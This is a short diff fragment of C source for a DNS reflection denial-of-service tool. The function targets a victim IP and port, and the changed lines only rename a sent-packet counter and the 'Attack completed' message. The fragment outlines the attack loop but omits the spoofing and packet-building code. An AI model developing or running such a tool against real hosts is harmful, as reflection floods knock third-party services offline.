@@ -104,7 +104,7 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 	psh.protocol = IPPROTO_UDP;
 	
 
-	int nPacketsSent = 0;
+	int nPacketSent = 0;
 
 	while (nPackets--){
 		//select hostname and dns server
@@ -147,11 +147,11 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 		//Data send successfully
 		else
 		{
-			nPacketsSent++;
+			nPacketSent++;
 		}
 	}
 	close(s);
-	printf("Attack completed. %d packets sent.\n", nPacketsSent);
+	printf("Attack completed. %d packets sent.\n", nPacketSent);
 
 }
 
